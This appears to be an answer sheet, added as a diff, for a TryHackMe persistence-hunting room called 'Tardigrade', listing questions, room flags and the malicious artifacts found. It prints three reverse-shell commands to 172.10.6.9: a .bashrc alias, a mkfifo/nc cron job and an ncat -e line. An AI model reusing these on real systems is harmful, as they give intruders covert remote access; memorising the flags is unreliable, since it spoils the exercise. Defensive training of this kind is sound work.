@@ -1,0 +1,32 @@
+Tardigrade
+https://tryhackme.com/room/tardigrade
+
+What is the server's OS version?
+Ubuntu 20.04.4 LTS
+
+What's the most interesting file you found in giorgio's home directory?
+.bad_bash
+
+Another file that can be found in every user's home directory is the .bashrc file. Can you check if you can find something interesting in giorgio's .bashrc?
+ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
+
+Did you find anything interesting about scheduled tasks?
+/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
+
+What is the flag?
+THM{d1rty_w0rdl1st}
+
+What does it say?
+Ncat: TIMEOUT.
+
+What command was displayed?
+ncat -e /bin/bash 172.10.6.9 6969
+
+Can you find out how the suspicious command has been implemented?
+.bashrc
+
+What is the last persistence mechanism?
+nobody
+
+What is the nugget?
+THM{Nob0dy_1s_s@f3}
